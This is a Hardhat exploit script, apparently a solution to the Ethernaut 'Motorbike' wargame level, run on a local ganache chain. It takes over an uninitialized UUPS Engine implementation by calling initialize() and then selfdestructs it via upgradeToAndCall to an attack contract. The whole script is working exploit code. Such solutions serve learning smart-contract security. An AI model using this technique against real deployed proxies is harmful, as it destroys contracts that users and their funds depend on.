/*
  Would you be able to selfdestruct its engine and make the motorbike unusable ?
    selfdestruct the Engine contract
*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player] = await ethers.getSigners();
  
  let tx;
  let txReceipt;

  const MotorbikeContractAddress = "0x945F5e83D94D8A84472D5ff3F1a5ad924A1e29Fa";  // Proxy

  // Get the address of the Implementation contract directly from the reserved slot on the Proxy contract to store the address of its Implementation contract!
  const IMPLEMENTATION_CONTRACT_ADDRESS_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  let EngineContractAddress = await hre.ethers.provider.getStorageAt(MotorbikeContractAddress, IMPLEMENTATION_CONTRACT_ADDRESS_SLOT);; 
  EngineContractAddress = EngineContractAddress.replace("000000000000000000000000", "");  // Implementation / Engine contract

  // Creating an instance of the deployed Motorbike contract
  this.motorbikeContract = await hre.ethers.getContractAt("Motorbike",MotorbikeContractAddress);

  // Creating an instance of the deployed Engine contract
  this.engineContract = await hre.ethers.getContractAt("Engine",EngineContractAddress);

  // Creating an instance of the deployed Motorbike contract using the logic of the Engine contract
  this.engineContractProxyInstance = await hre.ethers.getContractAt("Engine",MotorbikeContractAddress);

  console.log(
    `
    MotorbikeContractAddress ${MotorbikeContractAddress} \n
    Implementation Address from its slot on the Proxy contract!: ${EngineContractAddress} \n\n
    
    upgrader - PROXY:  ${await this.engineContractProxyInstance.upgrader()} \n
    horsePower - PROXY: ${await this.engineContractProxyInstance.horsePower()} \n

    upgrader - ENGINE:  ${await this.engineContract.upgrader()} \n
    horsePower - ENGINE: ${await this.engineContract.horsePower()} \n

    StorageAt slot0: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,0)}
    StorageAt slot1: ${await hre.ethers.provider.getStorageAt(MotorbikeContractAddress,1)} \n
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  // Setting the upgrader variable as the Player's address
  // Calling the inialize() of the Engine contract - Interacting directly with the Engine contract
  console.log("Calling the inialize() of the Engine contract - Interacting directly with the Engine contract");
  tx = await this.engineContract.connect(player).initialize();
  await tx.wait();

  console.log("Checking the upgrader variable was set as the Player's address");
  expect(await this.engineContract.upgrader()).to.eq(player.address);

  console.log("Deploying the Attack contract");
  const AttackMotorbike = await hre.ethers.getContractFactory("AttackMotorbike");
  this.attackMotorbike = await AttackMotorbike.connect(player).deploy();
  await this.attackMotorbike.deployed();

  const iface = new hre.ethers.utils.Interface([
    "function destroyContract()"
  ]);

  // Encoding the data that will be sent on the upgradeToAndCall
  const destroyContractEncoded = iface.encodeFunctionData("destroyContract",[]);
  
  console.log("Selfdestructing the Engine contract");
  tx = await this.engineContract.connect(player).upgradeToAndCall(this.attackMotorbike.address,destroyContractEncoded);
  txReceipt = await tx.wait();

  console.log("Was the Engine contract destructed?");
  tx = await this.attackMotorbike.connect(player).contractExists(EngineContractAddress);
  await tx.wait()

  console.log(await this.attackMotorbike.destroyed());
  expect(await this.attackMotorbike.destroyed()).to.eq(true);


  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});